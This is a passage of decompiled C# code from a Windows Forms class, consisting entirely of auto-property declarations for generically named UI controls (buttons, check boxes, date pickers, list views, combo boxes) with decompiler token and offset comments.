		internal virtual Button Button4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006D8 RID: 1752
		// (get) Token: 0x06000E1E RID: 3614 RVA: 0x0004EB8B File Offset: 0x0004CD8B
		// (set) Token: 0x06000E1F RID: 3615 RVA: 0x0004EB93 File Offset: 0x0004CD93
		internal virtual CheckBox CheckBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006D9 RID: 1753
		// (get) Token: 0x06000E20 RID: 3616 RVA: 0x0004EB9C File Offset: 0x0004CD9C
		// (set) Token: 0x06000E21 RID: 3617 RVA: 0x0004EBA4 File Offset: 0x0004CDA4
		internal virtual DateTimePicker DateTimePicker11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006DA RID: 1754
		// (get) Token: 0x06000E22 RID: 3618 RVA: 0x0004EBAD File Offset: 0x0004CDAD
		// (set) Token: 0x06000E23 RID: 3619 RVA: 0x0004EBB5 File Offset: 0x0004CDB5
		internal virtual DateTimePicker DateTimePicker12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006DB RID: 1755
		// (get) Token: 0x06000E24 RID: 3620 RVA: 0x0004EBBE File Offset: 0x0004CDBE
		// (set) Token: 0x06000E25 RID: 3621 RVA: 0x0004EBC6 File Offset: 0x0004CDC6
		internal virtual MonthCalendar MonthCalendar4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006DC RID: 1756
		// (get) Token: 0x06000E26 RID: 3622 RVA: 0x0004EBCF File Offset: 0x0004CDCF
		// (set) Token: 0x06000E27 RID: 3623 RVA: 0x0004EBD7 File Offset: 0x0004CDD7
		internal virtual Label Label8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006DD RID: 1757
		// (get) Token: 0x06000E28 RID: 3624 RVA: 0x0004EBE0 File Offset: 0x0004CDE0
		// (set) Token: 0x06000E29 RID: 3625 RVA: 0x0004EBE8 File Offset: 0x0004CDE8
		internal virtual ListView ListView12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006DE RID: 1758
		// (get) Token: 0x06000E2A RID: 3626 RVA: 0x0004EBF1 File Offset: 0x0004CDF1
		// (set) Token: 0x06000E2B RID: 3627 RVA: 0x0004EBF9 File Offset: 0x0004CDF9
		internal virtual PictureBox PictureBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006DF RID: 1759
		// (get) Token: 0x06000E2C RID: 3628 RVA: 0x0004EC02 File Offset: 0x0004CE02
		// (set) Token: 0x06000E2D RID: 3629 RVA: 0x0004EC0A File Offset: 0x0004CE0A
		internal virtual CheckedListBox CheckedListBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006E0 RID: 1760
		// (get) Token: 0x06000E2E RID: 3630 RVA: 0x0004EC13 File Offset: 0x0004CE13
		// (set) Token: 0x06000E2F RID: 3631 RVA: 0x0004EC1B File Offset: 0x0004CE1B
		internal virtual Label Label9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006E1 RID: 1761
		// (get) Token: 0x06000E30 RID: 3632 RVA: 0x0004EC24 File Offset: 0x0004CE24
		// (set) Token: 0x06000E31 RID: 3633 RVA: 0x0004EC2C File Offset: 0x0004CE2C
		internal virtual DateTimePicker DateTimePicker13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006E2 RID: 1762
		// (get) Token: 0x06000E32 RID: 3634 RVA: 0x0004EC35 File Offset: 0x0004CE35
		// (set) Token: 0x06000E33 RID: 3635 RVA: 0x0004EC3D File Offset: 0x0004CE3D
		internal virtual ComboBox ComboBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006E3 RID: 1763
		// (get) Token: 0x06000E34 RID: 3636 RVA: 0x0004EC46 File Offset: 0x0004CE46
		// (set) Token: 0x06000E35 RID: 3637 RVA: 0x0004EC4E File Offset: 0x0004CE4E
		internal virtual CheckedListBox CheckedListBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006E4 RID: 1764
		// (get) Token: 0x06000E36 RID: 3638 RVA: 0x0004EC57 File Offset: 0x0004CE57
		// (set) Token: 0x06000E37 RID: 3639 RVA: 0x0004EC5F File Offset: 0x0004CE5F
		internal virtual ListView ListView13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006E5 RID: 1765
		// (get) Token: 0x06000E38 RID: 3640 RVA: 0x0004EC68 File Offset: 0x0004CE68
		// (set) Token: 0x06000E39 RID: 3641 RVA: 0x0004EC70 File Offset: 0x0004CE70
		internal virtual MaskedTextBox MaskedTextBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006E6 RID: 1766
		// (get) Token: 0x06000E3A RID: 3642 RVA: 0x0004EC79 File Offset: 0x0004CE79
		// (set) Token: 0x06000E3B RID: 3643 RVA: 0x0004EC81 File Offset: 0x0004CE81
		internal virtual ListView ListView14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006E7 RID: 1767
		// (get) Token: 0x06000E3C RID: 3644 RVA: 0x0004EC8A File Offset: 0x0004CE8A
		// (set) Token: 0x06000E3D RID: 3645 RVA: 0x0004EC92 File Offset: 0x0004CE92
		internal virtual CheckedListBox CheckedListBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006E8 RID: 1768
		// (get) Token: 0x06000E3E RID: 3646 RVA: 0x0004EC9B File Offset: 0x0004CE9B
		// (set) Token: 0x06000E3F RID: 3647 RVA: 0x0004ECA3 File Offset: 0x0004CEA3
		internal virtual ComboBox ComboBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006E9 RID: 1769
		// (get) Token: 0x06000E40 RID: 3648 RVA: 0x0004ECAC File Offset: 0x0004CEAC
		// (set) Token: 0x06000E41 RID: 3649 RVA: 0x0004ECB4 File Offset: 0x0004CEB4
		internal virtual RadioButton RadioButton5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006EA RID: 1770
		// (get) Token: 0x06000E42 RID: 3650 RVA: 0x0004ECBD File Offset: 0x0004CEBD
		// (set) Token: 0x06000E43 RID: 3651 RVA: 0x0004ECC5 File Offset: 0x0004CEC5
		internal virtual ProgressBar ProgressBar5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006EB RID: 1771
		// (get) Token: 0x06000E44 RID: 3652 RVA: 0x0004ECCE File Offset: 0x0004CECE
		// (set) Token: 0x06000E45 RID: 3653 RVA: 0x0004ECD6 File Offset: 0x0004CED6
		internal virtual DateTimePicker DateTimePicker14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006EC RID: 1772
		// (get) Token: 0x06000E46 RID: 3654 RVA: 0x0004ECDF File Offset: 0x0004CEDF
		// (set) Token: 0x06000E47 RID: 3655 RVA: 0x0004ECE7 File Offset: 0x0004CEE7
		internal virtual MonthCalendar MonthCalendar5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006ED RID: 1773
		// (get) Token: 0x06000E48 RID: 3656 RVA: 0x0004ECF0 File Offset: 0x0004CEF0
		// (set) Token: 0x06000E49 RID: 3657 RVA: 0x0004ECF8 File Offset: 0x0004CEF8
		internal virtual PictureBox PictureBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006EE RID: 1774
		// (get) Token: 0x06000E4A RID: 3658 RVA: 0x0004ED01 File Offset: 0x0004CF01
		// (set) Token: 0x06000E4B RID: 3659 RVA: 0x0004ED09 File Offset: 0x0004CF09
		internal virtual CheckedListBox CheckedListBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006EF RID: 1775
		// (get) Token: 0x06000E4C RID: 3660 RVA: 0x0004ED12 File Offset: 0x0004CF12
		// (set) Token: 0x06000E4D RID: 3661 RVA: 0x0004ED1A File Offset: 0x0004CF1A
		internal virtual CheckedListBox CheckedListBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006F0 RID: 1776
		// (get) Token: 0x06000E4E RID: 3662 RVA: 0x0004ED23 File Offset: 0x0004CF23
		// (set) Token: 0x06000E4F RID: 3663 RVA: 0x0004ED2B File Offset: 0x0004CF2B
		internal virtual Label Label10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006F1 RID: 1777
		// (get) Token: 0x06000E50 RID: 3664 RVA: 0x0004ED34 File Offset: 0x0004CF34
		// (set) Token: 0x06000E51 RID: 3665 RVA: 0x0004ED3C File Offset: 0x0004CF3C
		internal virtual DateTimePicker DateTimePicker15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006F2 RID: 1778
		// (get) Token: 0x06000E52 RID: 3666 RVA: 0x0004ED45 File Offset: 0x0004CF45
		// (set) Token: 0x06000E53 RID: 3667 RVA: 0x0004ED4D File Offset: 0x0004CF4D
		internal virtual ComboBox ComboBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006F3 RID: 1779
		// (get) Token: 0x06000E54 RID: 3668 RVA: 0x0004ED56 File Offset: 0x0004CF56
		// (set) Token: 0x06000E55 RID: 3669 RVA: 0x0004ED5E File Offset: 0x0004CF5E
		internal virtual CheckedListBox CheckedListBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006F4 RID: 1780
		// (get) Token: 0x06000E56 RID: 3670 RVA: 0x0004ED67 File Offset: 0x0004CF67
		// (set) Token: 0x06000E57 RID: 3671 RVA: 0x0004ED6F File Offset: 0x0004CF6F
		internal virtual MaskedTextBox MaskedTextBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006F5 RID: 1781
		// (get) Token: 0x06000E58 RID: 3672 RVA: 0x0004ED78 File Offset: 0x0004CF78
		// (set) Token: 0x06000E59 RID: 3673 RVA: 0x0004ED80 File Offset: 0x0004CF80
		internal virtual ListView ListView15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006F6 RID: 1782
		// (get) Token: 0x06000E5A RID: 3674 RVA: 0x0004ED89 File Offset: 0x0004CF89
		// (set) Token: 0x06000E5B RID: 3675 RVA: 0x0004ED91 File Offset: 0x0004CF91
		internal virtual CheckBox CheckBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006F7 RID: 1783
		// (get) Token: 0x06000E5C RID: 3676 RVA: 0x0004ED9A File Offset: 0x0004CF9A
		// (set) Token: 0x06000E5D RID: 3677 RVA: 0x0004EDA2 File Offset: 0x0004CFA2
		internal virtual MaskedTextBox MaskedTextBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006F8 RID: 1784
		// (get) Token: 0x06000E5E RID: 3678 RVA: 0x0004EDAB File Offset: 0x0004CFAB
		// (set) Token: 0x06000E5F RID: 3679 RVA: 0x0004EDB3 File Offset: 0x0004CFB3
		internal virtual CheckBox CheckBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006F9 RID: 1785
		// (get) Token: 0x06000E60 RID: 3680 RVA: 0x0004EDBC File Offset: 0x0004CFBC
		// (set) Token: 0x06000E61 RID: 3681 RVA: 0x0004EDC4 File Offset: 0x0004CFC4
		internal virtual ListView ListView16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006FA RID: 1786
		// (get) Token: 0x06000E62 RID: 3682 RVA: 0x0004EDCD File Offset: 0x0004CFCD
		// (set) Token: 0x06000E63 RID: 3683 RVA: 0x0004EDD5 File Offset: 0x0004CFD5
		internal virtual CheckedListBox CheckedListBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006FB RID: 1787
		// (get) Token: 0x06000E64 RID: 3684 RVA: 0x0004EDDE File Offset: 0x0004CFDE
		// (set) Token: 0x06000E65 RID: 3685 RVA: 0x0004EDE6 File Offset: 0x0004CFE6
		internal virtual ComboBox ComboBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006FC RID: 1788
		// (get) Token: 0x06000E66 RID: 3686 RVA: 0x0004EDEF File Offset: 0x0004CFEF
		// (set) Token: 0x06000E67 RID: 3687 RVA: 0x0004EDF7 File Offset: 0x0004CFF7
		internal virtual RadioButton RadioButton6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006FD RID: 1789
		// (get) Token: 0x06000E68 RID: 3688 RVA: 0x0004EE00 File Offset: 0x0004D000
		// (set) Token: 0x06000E69 RID: 3689 RVA: 0x0004EE08 File Offset: 0x0004D008
		internal virtual ProgressBar ProgressBar6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006FE RID: 1790
		// (get) Token: 0x06000E6A RID: 3690 RVA: 0x0004EE11 File Offset: 0x0004D011
		// (set) Token: 0x06000E6B RID: 3691 RVA: 0x0004EE19 File Offset: 0x0004D019
		internal virtual Button Button5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170006FF RID: 1791
		// (get) Token: 0x06000E6C RID: 3692 RVA: 0x0004EE22 File Offset: 0x0004D022
		// (set) Token: 0x06000E6D RID: 3693 RVA: 0x0004EE2A File Offset: 0x0004D02A
		internal virtual CheckBox CheckBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000700 RID: 1792
		// (get) Token: 0x06000E6E RID: 3694 RVA: 0x0004EE33 File Offset: 0x0004D033
		// (set) Token: 0x06000E6F RID: 3695 RVA: 0x0004EE3B File Offset: 0x0004D03B
		internal virtual DateTimePicker DateTimePicker16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000701 RID: 1793
		// (get) Token: 0x06000E70 RID: 3696 RVA: 0x0004EE44 File Offset: 0x0004D044
		// (set) Token: 0x06000E71 RID: 3697 RVA: 0x0004EE4C File Offset: 0x0004D04C
		internal virtual DateTimePicker DateTimePicker17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000702 RID: 1794
		// (get) Token: 0x06000E72 RID: 3698 RVA: 0x0004EE55 File Offset: 0x0004D055
		// (set) Token: 0x06000E73 RID: 3699 RVA: 0x0004EE5D File Offset: 0x0004D05D
		internal virtual MonthCalendar MonthCalendar6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000703 RID: 1795
		// (get) Token: 0x06000E74 RID: 3700 RVA: 0x0004EE66 File Offset: 0x0004D066
		// (set) Token: 0x06000E75 RID: 3701 RVA: 0x0004EE6E File Offset: 0x0004D06E
		internal virtual Label Label11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000704 RID: 1796
		// (get) Token: 0x06000E76 RID: 3702 RVA: 0x0004EE77 File Offset: 0x0004D077
		// (set) Token: 0x06000E77 RID: 3703 RVA: 0x0004EE7F File Offset: 0x0004D07F
		internal virtual ListView ListView17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000705 RID: 1797
		// (get) Token: 0x06000E78 RID: 3704 RVA: 0x0004EE88 File Offset: 0x0004D088
		// (set) Token: 0x06000E79 RID: 3705 RVA: 0x0004EE90 File Offset: 0x0004D090
		internal virtual PictureBox PictureBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000706 RID: 1798
		// (get) Token: 0x06000E7A RID: 3706 RVA: 0x0004EE99 File Offset: 0x0004D099
		// (set) Token: 0x06000E7B RID: 3707 RVA: 0x0004EEA1 File Offset: 0x0004D0A1
		internal virtual CheckedListBox CheckedListBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000707 RID: 1799
		// (get) Token: 0x06000E7C RID: 3708 RVA: 0x0004EEAA File Offset: 0x0004D0AA
		// (set) Token: 0x06000E7D RID: 3709 RVA: 0x0004EEB2 File Offset: 0x0004D0B2
		internal virtual CheckedListBox CheckedListBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000708 RID: 1800
		// (get) Token: 0x06000E7E RID: 3710 RVA: 0x0004EEBB File Offset: 0x0004D0BB
		// (set) Token: 0x06000E7F RID: 3711 RVA: 0x0004EEC3 File Offset: 0x0004D0C3
		internal virtual Label Label12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000709 RID: 1801
		// (get) Token: 0x06000E80 RID: 3712 RVA: 0x0004EECC File Offset: 0x0004D0CC
		// (set) Token: 0x06000E81 RID: 3713 RVA: 0x0004EED4 File Offset: 0x0004D0D4
		internal virtual DateTimePicker DateTimePicker18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700070A RID: 1802
		// (get) Token: 0x06000E82 RID: 3714 RVA: 0x0004EEDD File Offset: 0x0004D0DD
		// (set) Token: 0x06000E83 RID: 3715 RVA: 0x0004EEE5 File Offset: 0x0004D0E5
		internal virtual ComboBox ComboBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700070B RID: 1803
		// (get) Token: 0x06000E84 RID: 3716 RVA: 0x0004EEEE File Offset: 0x0004D0EE
		// (set) Token: 0x06000E85 RID: 3717 RVA: 0x0004EEF6 File Offset: 0x0004D0F6
		internal virtual CheckedListBox CheckedListBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700070C RID: 1804
		// (get) Token: 0x06000E86 RID: 3718 RVA: 0x0004EEFF File Offset: 0x0004D0FF
		// (set) Token: 0x06000E87 RID: 3719 RVA: 0x0004EF07 File Offset: 0x0004D107
		internal virtual MaskedTextBox MaskedTextBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700070D RID: 1805
		// (get) Token: 0x06000E88 RID: 3720 RVA: 0x0004EF10 File Offset: 0x0004D110
		// (set) Token: 0x06000E89 RID: 3721 RVA: 0x0004EF18 File Offset: 0x0004D118
		internal virtual ListView ListView18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700070E RID: 1806
		// (get) Token: 0x06000E8A RID: 3722 RVA: 0x0004EF21 File Offset: 0x0004D121
		// (set) Token: 0x06000E8B RID: 3723 RVA: 0x0004EF29 File Offset: 0x0004D129
		internal virtual CheckBox CheckBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700070F RID: 1807
		// (get) Token: 0x06000E8C RID: 3724 RVA: 0x0004EF32 File Offset: 0x0004D132
		// (set) Token: 0x06000E8D RID: 3725 RVA: 0x0004EF3A File Offset: 0x0004D13A
		internal virtual MaskedTextBox MaskedTextBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000710 RID: 1808
		// (get) Token: 0x06000E8E RID: 3726 RVA: 0x0004EF43 File Offset: 0x0004D143
		// (set) Token: 0x06000E8F RID: 3727 RVA: 0x0004EF4B File Offset: 0x0004D14B
		internal virtual CheckBox CheckBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000711 RID: 1809
		// (get) Token: 0x06000E90 RID: 3728 RVA: 0x0004EF54 File Offset: 0x0004D154
		// (set) Token: 0x06000E91 RID: 3729 RVA: 0x0004EF5C File Offset: 0x0004D15C
		internal virtual ListView ListView19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000712 RID: 1810
		// (get) Token: 0x06000E92 RID: 3730 RVA: 0x0004EF65 File Offset: 0x0004D165
		// (set) Token: 0x06000E93 RID: 3731 RVA: 0x0004EF6D File Offset: 0x0004D16D
		internal virtual CheckedListBox CheckedListBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000713 RID: 1811
		// (get) Token: 0x06000E94 RID: 3732 RVA: 0x0004EF76 File Offset: 0x0004D176
		// (set) Token: 0x06000E95 RID: 3733 RVA: 0x0004EF7E File Offset: 0x0004D17E
		internal virtual ComboBox ComboBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000714 RID: 1812
		// (get) Token: 0x06000E96 RID: 3734 RVA: 0x0004EF87 File Offset: 0x0004D187
		// (set) Token: 0x06000E97 RID: 3735 RVA: 0x0004EF8F File Offset: 0x0004D18F
		internal virtual RadioButton RadioButton7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000715 RID: 1813
		// (get) Token: 0x06000E98 RID: 3736 RVA: 0x0004EF98 File Offset: 0x0004D198
		// (set) Token: 0x06000E99 RID: 3737 RVA: 0x0004EFA0 File Offset: 0x0004D1A0
		internal virtual ProgressBar ProgressBar7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000716 RID: 1814
		// (get) Token: 0x06000E9A RID: 3738 RVA: 0x0004EFA9 File Offset: 0x0004D1A9
		// (set) Token: 0x06000E9B RID: 3739 RVA: 0x0004EFB1 File Offset: 0x0004D1B1
		internal virtual Button Button6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000717 RID: 1815
		// (get) Token: 0x06000E9C RID: 3740 RVA: 0x0004EFBA File Offset: 0x0004D1BA
		// (set) Token: 0x06000E9D RID: 3741 RVA: 0x0004EFC2 File Offset: 0x0004D1C2
		internal virtual CheckBox CheckBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000718 RID: 1816
		// (get) Token: 0x06000E9E RID: 3742 RVA: 0x0004EFCB File Offset: 0x0004D1CB
		// (set) Token: 0x06000E9F RID: 3743 RVA: 0x0004EFD3 File Offset: 0x0004D1D3
		internal virtual DateTimePicker DateTimePicker19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000719 RID: 1817
		// (get) Token: 0x06000EA0 RID: 3744 RVA: 0x0004EFDC File Offset: 0x0004D1DC
		// (set) Token: 0x06000EA1 RID: 3745 RVA: 0x0004EFE4 File Offset: 0x0004D1E4
		internal virtual DateTimePicker DateTimePicker20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700071A RID: 1818
		// (get) Token: 0x06000EA2 RID: 3746 RVA: 0x0004EFED File Offset: 0x0004D1ED
		// (set) Token: 0x06000EA3 RID: 3747 RVA: 0x0004EFF5 File Offset: 0x0004D1F5
		internal virtual MonthCalendar MonthCalendar7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700071B RID: 1819
		// (get) Token: 0x06000EA4 RID: 3748 RVA: 0x0004EFFE File Offset: 0x0004D1FE
		// (set) Token: 0x06000EA5 RID: 3749 RVA: 0x0004F006 File Offset: 0x0004D206
		internal virtual Label Label13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700071C RID: 1820
		// (get) Token: 0x06000EA6 RID: 3750 RVA: 0x0004F00F File Offset: 0x0004D20F
		// (set) Token: 0x06000EA7 RID: 3751 RVA: 0x0004F017 File Offset: 0x0004D217
		internal virtual ListView ListView20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700071D RID: 1821
		// (get) Token: 0x06000EA8 RID: 3752 RVA: 0x0004F020 File Offset: 0x0004D220
		// (set) Token: 0x06000EA9 RID: 3753 RVA: 0x0004F028 File Offset: 0x0004D228
		internal virtual PictureBox PictureBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700071E RID: 1822
		// (get) Token: 0x06000EAA RID: 3754 RVA: 0x0004F031 File Offset: 0x0004D231
		// (set) Token: 0x06000EAB RID: 3755 RVA: 0x0004F039 File Offset: 0x0004D239
		internal virtual CheckedListBox CheckedListBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700071F RID: 1823
		// (get) Token: 0x06000EAC RID: 3756 RVA: 0x0004F042 File Offset: 0x0004D242
		// (set) Token: 0x06000EAD RID: 3757 RVA: 0x0004F04A File Offset: 0x0004D24A
		internal virtual CheckedListBox CheckedListBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000720 RID: 1824
		// (get) Token: 0x06000EAE RID: 3758 RVA: 0x0004F053 File Offset: 0x0004D253
		// (set) Token: 0x06000EAF RID: 3759 RVA: 0x0004F05B File Offset: 0x0004D25B
		internal virtual Label Label14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000721 RID: 1825
		// (get) Token: 0x06000EB0 RID: 3760 RVA: 0x0004F064 File Offset: 0x0004D264
		// (set) Token: 0x06000EB1 RID: 3761 RVA: 0x0004F06C File Offset: 0x0004D26C
		internal virtual DateTimePicker DateTimePicker21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000722 RID: 1826
		// (get) Token: 0x06000EB2 RID: 3762 RVA: 0x0004F075 File Offset: 0x0004D275
		// (set) Token: 0x06000EB3 RID: 3763 RVA: 0x0004F07D File Offset: 0x0004D27D
		internal virtual ComboBox ComboBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000723 RID: 1827
		// (get) Token: 0x06000EB4 RID: 3764 RVA: 0x0004F086 File Offset: 0x0004D286
		// (set) Token: 0x06000EB5 RID: 3765 RVA: 0x0004F08E File Offset: 0x0004D28E
		internal virtual CheckedListBox CheckedListBox30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000724 RID: 1828
		// (get) Token: 0x06000EB6 RID: 3766 RVA: 0x0004F097 File Offset: 0x0004D297
		// (set) Token: 0x06000EB7 RID: 3767 RVA: 0x0004F09F File Offset: 0x0004D29F
		internal virtual MaskedTextBox MaskedTextBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000725 RID: 1829
		// (get) Token: 0x06000EB8 RID: 3768 RVA: 0x0004F0A8 File Offset: 0x0004D2A8
		// (set) Token: 0x06000EB9 RID: 3769 RVA: 0x0004F0B0 File Offset: 0x0004D2B0
		internal virtual ListView ListView21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000726 RID: 1830
		// (get) Token: 0x06000EBA RID: 3770 RVA: 0x0004F0B9 File Offset: 0x0004D2B9
		// (set) Token: 0x06000EBB RID: 3771 RVA: 0x0004F0C1 File Offset: 0x0004D2C1
		internal virtual CheckBox CheckBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000727 RID: 1831
		// (get) Token: 0x06000EBC RID: 3772 RVA: 0x0004F0CA File Offset: 0x0004D2CA
		// (set) Token: 0x06000EBD RID: 3773 RVA: 0x0004F0D2 File Offset: 0x0004D2D2
		internal virtual MaskedTextBox MaskedTextBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000728 RID: 1832
		// (get) Token: 0x06000EBE RID: 3774 RVA: 0x0004F0DB File Offset: 0x0004D2DB
		// (set) Token: 0x06000EBF RID: 3775 RVA: 0x0004F0E3 File Offset: 0x0004D2E3
		internal virtual CheckBox CheckBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000729 RID: 1833
		// (get) Token: 0x06000EC0 RID: 3776 RVA: 0x0004F0EC File Offset: 0x0004D2EC
		// (set) Token: 0x06000EC1 RID: 3777 RVA: 0x0004F0F4 File Offset: 0x0004D2F4
		internal virtual ListView ListView22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700072A RID: 1834
		// (get) Token: 0x06000EC2 RID: 3778 RVA: 0x0004F0FD File Offset: 0x0004D2FD
		// (set) Token: 0x06000EC3 RID: 3779 RVA: 0x0004F105 File Offset: 0x0004D305
		internal virtual CheckedListBox CheckedListBox31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700072B RID: 1835
		// (get) Token: 0x06000EC4 RID: 3780 RVA: 0x0004F10E File Offset: 0x0004D30E
		// (set) Token: 0x06000EC5 RID: 3781 RVA: 0x0004F116 File Offset: 0x0004D316
		internal virtual ComboBox ComboBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700072C RID: 1836
		// (get) Token: 0x06000EC6 RID: 3782 RVA: 0x0004F11F File Offset: 0x0004D31F
		// (set) Token: 0x06000EC7 RID: 3783 RVA: 0x0004F127 File Offset: 0x0004D327
		internal virtual RadioButton RadioButton8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700072D RID: 1837
		// (get) Token: 0x06000EC8 RID: 3784 RVA: 0x0004F130 File Offset: 0x0004D330
		// (set) Token: 0x06000EC9 RID: 3785 RVA: 0x0004F138 File Offset: 0x0004D338
		internal virtual ProgressBar ProgressBar8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700072E RID: 1838
		// (get) Token: 0x06000ECA RID: 3786 RVA: 0x0004F141 File Offset: 0x0004D341
		// (set) Token: 0x06000ECB RID: 3787 RVA: 0x0004F149 File Offset: 0x0004D349
		internal virtual Button Button7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700072F RID: 1839
		// (get) Token: 0x06000ECC RID: 3788 RVA: 0x0004F152 File Offset: 0x0004D352
		// (set) Token: 0x06000ECD RID: 3789 RVA: 0x0004F15A File Offset: 0x0004D35A
		internal virtual CheckBox CheckBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

